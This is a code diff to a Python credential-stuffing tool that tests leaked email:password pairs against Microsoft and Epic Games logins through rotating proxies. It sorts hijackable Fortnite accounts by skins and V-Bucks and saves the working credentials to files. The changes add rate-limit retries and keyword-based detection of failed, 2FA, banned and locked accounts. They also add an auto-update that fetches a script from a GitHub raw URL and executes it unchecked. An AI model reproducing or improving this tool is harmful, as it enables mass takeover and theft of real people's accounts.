@@ -117,7 +117,7 @@ class Main:
         self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
         self.domain_list = self.lisr()
         disable_warnings()
-        self.version = '1.0'
+        self.version = '1.1'
         self.printing = Queue()
         self.caputer = Queue()
         self.start_time = 0
@@ -180,7 +180,18 @@ class Main:
         else:
             print(Fore.YELLOW)
             print_slowly('You are using an outdated version!', 0.05)
-            os.system('exit')
+            print(Fore.CYAN)
+            print_slowly(f'Downloading version {ver}', 0.01)
+            while True:
+                try:
+                    r = requests.get('https://raw.githubusercontent.com/Shaggymop/BoltFN/main/boltchecker.py', timeout=10)
+                    with open(f'Boltchecker{ver}.py', 'w', encoding='utf8') as file:
+                        file.write(r.text)
+                    break
+                except Exception as e:
+                    print(f'{Fore.RED}Error downloading new version {e}')
+            os.system('cls')
+            os.system(f'py Boltchecker{ver}.py')
         from time import time
         system('cls')
         windll.kernel32.SetConsoleTitleW(
@@ -610,11 +621,55 @@ class Main:
                             while True:
                                 try:
                                     response = session.post(url, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
-                                    break
+                                    if 'Too Many Requests' in response.text:
+                                        Counter.retries+=1
+                                        continue
+                                    else:
+                                        break
                                 except Exception as e:
                                     Counter.retries+=1
                                     continue
-                            result = self.check_response(response)
+                            r = response
+                            failure_keywords = [
+                                "Your account or password is incorrect.",
+                                "That Microsoft account doesn\\'t exist. Enter a different account",
+                                "Sign in to your Microsoft account",
+                                'const trackingBase="https://tracking.epicgames.com,https://tracking.unrealengine.com"',
+                                'Please sign in with a Microsoft account or create a new account',
+                            ]
+
+                            ban_keywords = [
+                                                ",AC:null,urlFedConvertRename",
+                                            ]
+
+
+                            two_factor_keywords = [
+                                                "account.live.com/recover?mkt",
+                                                "recover?mkt",
+                                                "account.live.com/identity/confirm?mkt",
+                                                "Email/Confirm?mkt",
+                                                "Help us protect your account",
+                                            ]
+
+                            custom_keywords = [
+                                                "/cancel?mkt=",
+                                                "/Abuse?mkt=",
+                                            ]
+                            cookies = r.cookies.get_dict()
+                            result = 'Unknown'
+                            if any(keyword in r.text.strip() for keyword in failure_keywords):
+                                result = 'Failure'
+                            elif any(keyword in r.text.strip() for keyword in ban_keywords):
+                                result = 'Ban'
+                            elif any(keyword in r.text.strip() for keyword in two_factor_keywords):
+                                result = '2FACTOR'
+                            elif any(keyword in r.text.strip() for keyword in custom_keywords):
+                                result = "CUSTOM"
+                            elif any(keyword in cookies for keyword in ["ANON", "WLSSC"]) or \
+                            any(keyword in r.url for keyword in ["https://login.live.com/oauth20_desktop.srf?"]) or \
+                            "sSigninName" in r.text.strip():
+                                result = "Success"
+
                             if result == 'Failure' or result == '2FACTOR' or result == 'Ban' or result == 'CUSTOM' or result == 'Unknown':
                                 checked_num+=1
                                 Counter.retries+=1    
@@ -778,7 +833,7 @@ class Main:
                                         }
                                         while True:
                                             try:
-                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                response2 = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                 break
                                             except Exception as e:
                                                 Counter.retries+=1
@@ -813,11 +868,20 @@ class Main:
                                             "X-Xsrf-Token": xsrf_token_cookie
                                         }
                                         ret = 0
+                                        skip = False
                                         while True:
                                             try:
-                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                if 'Sorry, your account has too many active logins' in response.text:
+                                                        Counter.hits+=1
+                                                        if not os.path.exists(self.folder + '/NoCapture'):
+                                                            os.makedirs(self.folder + '/NoCapture')
+                                                        open(f'{self.folder}/NoCapture/logins.txt', 'a',
+                                                        encoding='u8').write(f'{line}\n')
+                                                        return
                                                 if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                     if ret >= Checker.retries:
+                                                        Counter.mshit+=1
                                                         Counter.epic2fa
                                                         if 'n' == self.cuimode:
                                                             self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
@@ -828,41 +892,136 @@ class Main:
                                                         return
                                                     else:
                                                         ret+=1
+                                                        Counter.retries+=1
                                                         continue  
                                                 sid = response.json()
                                                 sid = sid.get("sid")
                                                 if sid:
+                                                    skip = True
                                                     break
                                                 else:
+                                                    print(response.text)
                                                     Counter.retries+=1
                                                     continue
                                             except Exception as e:
+                                                print(response.text)
                                                 Counter.retries+=1
                                                 continue
                                         if not os.path.exists(self.folder + '/NoCapture'):
                                             os.makedirs(self.folder + '/NoCapture')
-                                        open(f'{self.folder}/NoCapture/raw.txt', 'a',
+                                        open(f'{self.folder}/NoCapture/all.txt', 'a',
                                         encoding='u8').write(f'{line}\n')
-                                        url = f"https://www.epicgames.com/id/api/sso?sid={sid}"
+                                        url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
                                         headers = {
-                                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                                                "Accept": "application/json, text/plain, */*",
                                                 "Accept-Encoding": "gzip, deflate, br, zstd",
-                                                "Accept-Language": "en-US,en;q=0.9",
+                                                "Accept-Language": "en-US",
                                                 "Cache-Control": "no-cache",
                                                 "Pragma": "no-cache",
-                                                "Priority": "u=0, i",
+                                                "Priority": "u=1, i",
                                                 "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
                                                 "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                                                 "Sec-Ch-Ua-Mobile": "?0",
                                                 "Sec-Ch-Ua-Platform": "\"Windows\"",
-                                                "Sec-Fetch-Dest": "document",
-                                                "Sec-Fetch-Mode": "navigate",
+                                                "Sec-Fetch-Dest": "empty",
+                                                "Sec-Fetch-Mode": "cors",
                                                 "Sec-Fetch-Site": "same-origin",
-                                                "Upgrade-Insecure-Requests": "1",
-                                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+                                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+                                                "X-Epic-Access-Key": "undefined",
+                                                "X-Epic-Client-Id": "875a3b57d3a640a6b7f9b4e883463ab4",
+                                                "X-Epic-Display-Mode": "web",
+                                                "X-Epic-Duration": "2173",
+                                                "X-Epic-Event-Action": "external",
+                                                "X-Epic-Event-Category": "login",
+                                                "X-Epic-Flow": "login",
+                                                "X-Epic-Idp-Provider": "xbl",
+                                                "X-Epic-Platform": "WEB",
+                                                "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
+                                                "X-Requested-With": "XMLHttpRequest",
+                                                "X-Xsrf-Token": xsrf_token_cookie
                                         }
                                         while True:
+                                            while True:
+                                                try:
+                                                    if skip:
+                                                        break
+                                                    url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
+                                                    headers = {
+                                                            "Accept": "application/json, text/plain, */*",
+                                                            "Accept-Encoding": "gzip, deflate, br, zstd",
+                                                            "Accept-Language": "en-US",
+                                                            "Cache-Control": "no-cache",
+                                                            "Pragma": "no-cache",
+                                                            "Priority": "u=1, i",
+                                                            "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
+                                                            "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
+                                                            "Sec-Ch-Ua-Mobile": "?0",
+                                                            "Sec-Ch-Ua-Platform": "\"Windows\"",
+                                                            "Sec-Fetch-Dest": "empty",
+                                                            "Sec-Fetch-Mode": "cors",
+                                                            "Sec-Fetch-Site": "same-origin",
+                                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+                                                            "X-Epic-Access-Key": "undefined",
+                                                            "X-Epic-Client-Id": "875a3b57d3a640a6b7f9b4e883463ab4",
+                                                            "X-Epic-Display-Mode": "web",
+                                                            "X-Epic-Duration": "2173",
+                                                            "X-Epic-Event-Action": "external",
+                                                            "X-Epic-Event-Category": "login",
+                                                            "X-Epic-Flow": "login",
+                                                            "X-Epic-Idp-Provider": "xbl",
+                                                            "X-Epic-Platform": "WEB",
+                                                            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
+                                                            "X-Requested-With": "XMLHttpRequest",
+                                                            "X-Xsrf-Token": xsrf_token_cookie
+                                                    }
+                                                    response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
+                                                    if 'Sorry, your account has too many active logins' in response.text:
+                                                        Counter.hits+=1
+                                                        if not os.path.exists(self.folder + '/NoCapture'):
+                                                            os.makedirs(self.folder + '/NoCapture')
+                                                        open(f'{self.folder}/NoCapture/logins.txt', 'a',
+                                                        encoding='u8').write(f'{line}\n')
+                                                        return
+                                                    if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
+                                                            Counter.mshit+=1
+                                                            Counter.epic2fa
+                                                            if 'n' == self.cuimode:
+                                                                self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
+                                                            if not os.path.exists(self.folder + '/Microsoft'):
+                                                                os.makedirs(self.folder + '/Microsoft')
+                                                            open(f'{self.folder}/Microsoft/2fa.txt', 'a',
+                                                            encoding='u8').write(f'{line}\n')
+                                                            return
+                                                    sid = response.json()
+                                                    sid = sid.get("sid")
+                                                    if sid:
+                                                        break
+                                                    else:
+                                                        Counter.retries+=1
+                                                        continue
+                                                except Exception as e:
+                                                    Counter.retries+=1
+                                                    continue
+                                            skip = False
                                             z = False
+                                            url = f"https://www.epicgames.com/id/api/sso?sid={sid}"
+                                            headers = {
+                                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                                                    "Accept-Encoding": "gzip, deflate, br, zstd",
+                                                    "Accept-Language": "en-US,en;q=0.9",
+                                                    "Cache-Control": "no-cache",
+                                                    "Pragma": "no-cache",
+                                                    "Priority": "u=0, i",
+                                                    "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
+                                                    "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
+                                                    "Sec-Ch-Ua-Mobile": "?0",
+                                                    "Sec-Ch-Ua-Platform": "\"Windows\"",
+                                                    "Sec-Fetch-Dest": "document",
+                                                    "Sec-Fetch-Mode": "navigate",
+                                                    "Sec-Fetch-Site": "same-origin",
+                                                    "Upgrade-Insecure-Requests": "1",
+                                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+                                            }
                                             while True:
                                                 if z:break
                                                 try:
@@ -871,11 +1030,14 @@ class Main:
                                                         url = response.headers['location']
                                                         break
                                                     else:
+                                                        Counter.retries+=1
                                                         z = True
                                                         continue
                                                 except KeyError:
+                                                    Counter.retries+=1
                                                     z = True
                                                 except Exception as e:
+                                                    Counter.retries+=1
                                                     z = True
                                                     continue
                                             if z:continue
@@ -904,11 +1066,14 @@ class Main:
                                                         url = response.headers['location']
                                                         break
                                                     else:
+                                                        Counter.retries+=1
                                                         g = True
                                                         continue
                                                 except KeyError:
+                                                    Counter.retries+=1
                                                     g = True
                                                 except Exception as e:
+                                                    Counter.retries+=1
                                                     g = True
                                                     continue
                                             if g:continue
@@ -921,9 +1086,11 @@ class Main:
                                                         url = response.headers['location']
                                                         break
                                                     else:
+                                                        Counter.retries+=1
                                                         e = True
                                                         continue
                                                 except KeyError:
+                                                    Counter.retries+=1
                                                     e = True
                                                 except:
                                                     continue
@@ -935,11 +1102,14 @@ class Main:
                                                     if 'eg1~' in response.cookies['REFRESH_EPIC_EG1']:
                                                         break
                                                     else:
+                                                        Counter.retries+=1
                                                         f = True
                                                         continue
                                                 except KeyError:
+                                                    Counter.retries+=1
                                                     f = True
                                                 except Exception as e:
+                                                    Counter.retries+=1
                                                     continue
                                             if f:continue
                                             break
@@ -1130,7 +1300,7 @@ class Main:
                                                 Counter.mshit +=1
                                                 Counter.fnban+=1
                                                 if 'n' == self.cuimode:
-                                                    self.prints(f'{Fore.YELLOW}[FN-BAN]] - {line}')
+                                                    self.prints(f'{Fore.YELLOW}[FN-BAN] - {line}')
                                                 if not os.path.exists(self.folder + '/Microsoft'):
                                                     os.makedirs(self.folder + '/Microsoft')
                                                 open(f'{self.folder}/Microsoft/Banned.txt', 'a',
@@ -1180,7 +1350,7 @@ class Main:
                                                                 while True:
                                                                     try:
                                                                         url = f'https://fn-db.com/outfit/{skin_id}'
-                                                                        skin_name = requests.get(url, proxies=self.proxies())
+                                                                        skin_name = requests.get(url, proxies=self.proxies(), timeout=Checker.timeout)
                                                                         if '<h1 class="font-weight-bold">' in skin_name.text:
                                                                             soup = BeautifulSoup(skin_name.text, 'html.parser')
                                                                             japanese_text = soup.h1.get_text()
@@ -1192,6 +1362,7 @@ class Main:
                                                                             skinName = skin_id
                                                                             break
                                                                     except Exception as e:
+                                                                        Counter.retries +=1
                                                                         continue
                                                             skins.append(skinName)
                                                         else:
@@ -1276,8 +1447,8 @@ class Main:
                                                 self.prints(
                                                 f'{Fore.GREEN}[FN-HIT]' +
                                                 ('[FA]' if epicEmail.lower() == email.lower() else '[NFA]') +
-                                                (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                 (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
+                                                (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                 (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                                                 (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') +
                                                 f' - {line}'
@@ -1288,7 +1459,7 @@ class Main:
                                             Counter.skins_data.append({"fullAccess": fullAccess, "total_skins": total_skins, "exclusive": exclusive})
                                             if not os.path.exists(self.folder + '/Fortnite'):
                                                 os.makedirs(self.folder + '/Fortnite')
-                                            open(f'{self.folder}/Fortnite/Raw.txt', 'a',
+                                            open(f'{self.folder}/Fortnite/all.txt', 'a',
                                             encoding='u8').write(f'{line}\n')
                                             message = f"Email: {email}\nPassword: {password}\nName: {display_name}\nType: {fullAccess}"
                                             if tfa_enabled != None: message+=f"\n2FA: {tfa_enabled}"
@@ -1313,26 +1484,54 @@ class Main:
                                                 open(f'{self.folder}/Fortnite/Exclusive/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
                                             elif int(total_skins) == 0:
-                                                open(f'{self.folder}/Fortnite/0 Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/NoSkins'):
+                                                    os.makedirs(self.folder + '/Fortnite/NoSkins')
+                                                open(f'{self.folder}/Fortnite/NoSkins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/NoSkins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 1 and int(total_skins) < 10:
-                                                open(f'{self.folder}/Fortnite/1-9 Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/1-9Skins'):
+                                                    os.makedirs(self.folder + '/Fortnite/1-9Skins')
+                                                open(f'{self.folder}/Fortnite/1-9Skins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/1-9Skins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 10 and int(total_skins) < 50:
-                                                open(f'{self.folder}/Fortnite/10-49 Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/10-49Skins'):
+                                                    os.makedirs(self.folder + '/Fortnite/10-49Skins')
+                                                open(f'{self.folder}/Fortnite/10-49Skins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/10-49Skins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 50 and int(total_skins) < 100:
-                                                open(f'{self.folder}/Fortnite/50-99 Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/50-99Skins'):
+                                                    os.makedirs(self.folder + '/Fortnite/50-99Skins')
+                                                open(f'{self.folder}/Fortnite/50-99Skins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/50-99Skins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 100 and int(total_skins) < 200:
-                                                open(f'{self.folder}/Fortnite/100-199 Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/100-199Skins'):
+                                                    os.makedirs(self.folder + '/Fortnite/100-199Skins')
+                                                open(f'{self.folder}/Fortnite/100-199Skins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/100-199Skins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 200 and int(total_skins) < 300:
-                                                open(f'{self.folder}/Fortnite/200-299 Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/200-299Skins'):
+                                                    os.makedirs(self.folder + '/Fortnite/200-299Skins')
+                                                open(f'{self.folder}/Fortnite/200-299Skins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/200-299Skins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             elif int(total_skins) >= 300:
-                                                open(f'{self.folder}/Fortnite/300+ Skins.txt', 'a',
+                                                if not os.path.exists(self.folder + '/Fortnite/300+Skins'):
+                                                    os.makedirs(self.folder + '/Fortnite/300+Skins')
+                                                open(f'{self.folder}/Fortnite/300+Skins/{str(total_skins)} Skins.txt', 'a',
                                                 encoding='u8').write(f'{message}\n')
+                                                open(f'{self.folder}/Fortnite/300+Skins/All.txt', 'a',
+                                                encoding='u8').write(f'{line}\n')
                                             return
                                         except Exception as e:
                                             Counter.retries+=1
@@ -1344,7 +1543,6 @@ class Main:
                                         continue
                                 else:
                                     checked_num +=1
-                                    Counter.retries+=1
                                     Counter.retries+=1
                                     continue
                     else:
@@ -1358,6 +1556,7 @@ class Main:
                                         os.makedirs(self.folder + '/Bad')
                                     open(f'{self.folder}/Bad/Invalid.txt', 'a',
                                         encoding='u8').write(f'{line}\n')
+                            return
                         elif result == '2FACTOR':
                             Counter.custom+=1
                             if 'n' == self.cuimode:
@@ -1367,6 +1566,7 @@ class Main:
                                     os.makedirs(self.folder + '/Bad')
                                 open(f'{self.folder}/Bad/2fa.txt', 'a',
                                 encoding='u8').write(f'{line}\n')
+                            return
                         elif result == 'Ban':
                             Counter.custom+=1
                             if 'n' == self.cuimode:
@@ -1376,6 +1576,7 @@ class Main:
                                     os.makedirs(self.folder + '/Bad')
                                 open(f'{self.folder}/Bad/Banned.txt', 'a',
                                 encoding='u8').write(f'{line}\n')
+                            return
                         elif result == 'CUSTOM':
                             Counter.locked+=1
                             if 'n' == self.cuimode:
@@ -1385,10 +1586,18 @@ class Main:
                                     os.makedirs(self.folder + '/Bad')
                                 open(f'{self.folder}/Bad/Locked.txt', 'a',
                                 encoding='u8').write(f'{line}\n')
+                            return
                         elif result == 'Unknown':
-                            self.usecheck(line)
-                        return
-                return
+                                Counter.bad+=1
+                                if Checker.printbadd:
+                                    if 'n' == self.cuimode:
+                                        self.prints(f'{Fore.RED}[BAD] - {line}')
+                                    if Checker.save_bad:
+                                        if not os.path.exists(self.folder + '/Bad'):
+                                            os.makedirs(self.folder + '/Bad')
+                                        open(f'{self.folder}/Bad/Unknown.txt', 'a',
+                                            encoding='u8').write(f'{line}\n')
+                                return
             else:
                 Counter.bad+=1
                 return
@@ -1481,45 +1690,7 @@ class Main:
             url = match.group(1)
             return url
         return None
-    def check_response(self,r):
-        failure_keywords = [
-            "Your account or password is incorrect.",
-            "That Microsoft account doesn\\'t exist. Enter a different account",
-            "Sign in to your Microsoft account"
-        ]
-
-        ban_keywords = [
-                            ",AC:null,urlFedConvertRename"
-                        ]
-
-
-        two_factor_keywords = [
-                            "account.live.com/recover?mkt",
-                            "recover?mkt",
-                            "account.live.com/identity/confirm?mkt",
-                            "Email/Confirm?mkt"
-                            "Help us protect your account"
-                        ]
-
-        custom_keywords = [
-                            "/cancel?mkt=",
-                            "/Abuse?mkt="
-                        ]
-        cookies = r.cookies.get_dict()
-        if any(keyword in r.text for keyword in failure_keywords):
-            return "Failure"
-        if any(keyword in r.text for keyword in ban_keywords):
-            return "Ban"
-        if any(keyword in r.text for keyword in two_factor_keywords):
-            return "2FACTOR"
-        if any(keyword in r.text for keyword in custom_keywords):
-            return "CUSTOM"
-        if any(keyword in cookies for keyword in ["ANON", "WLSSC"]) or \
-        any(keyword in r.url for keyword in ["https://login.live.com/oauth20_desktop.srf?"]) or \
-        "sSigninName" in r.text:
-            return "Success"
-
-        return "Unknown"
+    
 
     def urlscraper(self):
         urls = []
@@ -1608,9 +1779,9 @@ class Main:
 
     def cpm_counter(self):
         while True:
-            checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban + Counter.epic2fa
+            checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked
             sleep(0.5)
-            awa = (Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban + Counter.epic2fa)-checked
+            awa = (Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked)-checked
             Counter.cpm = awa * 60
 
     def prints(self, line):
